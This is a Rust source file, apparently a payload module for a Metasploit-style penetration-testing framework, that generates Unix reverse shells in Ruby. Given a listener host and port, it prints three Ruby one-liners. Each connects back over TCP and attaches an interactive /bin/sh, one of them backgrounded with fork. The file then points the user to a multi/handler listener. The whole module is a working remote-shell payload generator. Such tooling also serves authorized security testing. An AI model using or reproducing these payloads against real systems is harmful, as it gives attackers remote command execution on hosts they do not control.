//! Unix Ruby Reverse TCP Shell Payload Generator
//!
//! Creates an interactive shell via Ruby's TCPSocket.

use amatsumara_api::*;
use std::os::raw::{c_char, c_int, c_void};
use serde::Deserialize;
use std::ffi::CStr;

static NAME: &str = "Unix Ruby Reverse TCP";
static DESCRIPTION: &str = "Reverse shell via Ruby TCPSocket";
static AUTHOR: &str = "Amatsumara Project";
static PLATFORMS: &[Platform] = &[Platform::Linux, Platform::BSD];
static ARCHS: &[Arch] = &[Arch::X64, Arch::X86, Arch::ARM64];

static LHOST_NAME: &str = "LHOST";
static LHOST_DESC: &str = "Listener address";
static LHOST_DEFAULT: &str = "127.0.0.1";
static LPORT_NAME: &str = "LPORT";
static LPORT_DESC: &str = "Listener port";
static LPORT_DEFAULT: &str = "4444";

static OPTIONS: &[ModuleOption] = &[
    ModuleOption {
        name: CString { ptr: LHOST_NAME.as_ptr() as *const c_char, len: LHOST_NAME.len() },
        description: CString { ptr: LHOST_DESC.as_ptr() as *const c_char, len: LHOST_DESC.len() },
        required: true,
        option_type: OptionType::Address,
        default_value: CString { ptr: LHOST_DEFAULT.as_ptr() as *const c_char, len: LHOST_DEFAULT.len() },
    },
    ModuleOption {
        name: CString { ptr: LPORT_NAME.as_ptr() as *const c_char, len: LPORT_NAME.len() },
        description: CString { ptr: LPORT_DESC.as_ptr() as *const c_char, len: LPORT_DESC.len() },
        required: true,
        option_type: OptionType::Port,
        default_value: CString { ptr: LPORT_DEFAULT.as_ptr() as *const c_char, len: LPORT_DEFAULT.len() },
    },
];

static MODULE_INFO: ModuleInfo = ModuleInfo {
    api_version: MODULE_API_VERSION,
    metadata: ModuleMetadata {
        name: CString { ptr: NAME.as_ptr() as *const c_char, len: NAME.len() },
        description: CString { ptr: DESCRIPTION.as_ptr() as *const c_char, len: DESCRIPTION.len() },
        author: CString { ptr: AUTHOR.as_ptr() as *const c_char, len: AUTHOR.len() },
        module_type: ModuleType::Payload,
        platforms: PlatformArray { ptr: PLATFORMS.as_ptr(), len: PLATFORMS.len() },
        archs: ArchArray { ptr: ARCHS.as_ptr(), len: ARCHS.len() },
        ranking: Ranking::Normal,
        privileged: false,
    },
    options: OptionArray { ptr: OPTIONS.as_ptr(), len: OPTIONS.len() },
};

static VTABLE: ModuleVTable = ModuleVTable { get_info, init, destroy, check: None, run };
struct ModuleInstance { _dummy: u8 }

#[derive(Deserialize, Debug)]
struct PayloadOptions {
    #[serde(rename = "LHOST")]
    lhost: Option<String>,
    #[serde(rename = "LPORT")]
    lport: Option<String>,
}

extern "C" fn get_info() -> *const ModuleInfo { &MODULE_INFO }
extern "C" fn init() -> *mut c_void { Box::into_raw(Box::new(ModuleInstance { _dummy: 0 })) as *mut c_void }
extern "C" fn destroy(instance: *mut c_void) { if !instance.is_null() { unsafe { let _ = Box::from_raw(instance as *mut ModuleInstance); } } }

extern "C" fn run(_instance: *mut c_void, config: *const c_char) -> c_int {
    let options: PayloadOptions = match parse_options(config) {
        Ok(opts) => opts,
        Err(e) => { eprintln!("[-] Parse error: {}", e); return 1; }
    };

    let lhost = match options.lhost {
        Some(h) => h,
        None => { eprintln!("[-] LHOST required"); return 1; }
    };

    let lport = match options.lport {
        Some(p) => p,
        None => { eprintln!("[-] LPORT required"); return 1; }
    };

    // Metasploit-style ruby reverse shell (backgrounded with fork)
    let payload = format!(
        r#"ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{}","{}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'"#,
        lhost, lport
    );

    // Alternative with exec and fd redirection
    let payload_exec = format!(
        r#"ruby -rsocket -e 'f=TCPSocket.open("{}",{}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"#,
        lhost, lport
    );

    // Full interactive shell version
    let payload_full = format!(
        r#"ruby -rsocket -e 'c=TCPSocket.new("{}","{}");$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);exec "/bin/sh -i"'"#,
        lhost, lport
    );

    println!("\n[+] Ruby Reverse Shell Payload:");
    println!("    Target: {}:{}\n", lhost, lport);

    println!("=== Option 1: Backgrounded with IO.popen ===");
    println!("{}", payload);

    println!("\n=== Option 2: exec with fd redirection ===");
    println!("{}", payload_exec);

    println!("\n=== Option 3: Full interactive (foreground) ===");
    println!("{}", payload_full);

    println!("\n[*] Ensure handler is listening: use exploit/multi/handler");

    0
}

fn parse_options(config: *const c_char) -> Result<PayloadOptions, Box<dyn std::error::Error>> {
    if config.is_null() {
        return Ok(PayloadOptions { lhost: None, lport: None });
    }
    Ok(serde_json::from_str(unsafe { CStr::from_ptr(config).to_str()? })?)
}

#[no_mangle]
pub extern "C" fn msf_module_init() -> *const ModuleVTable { &VTABLE }
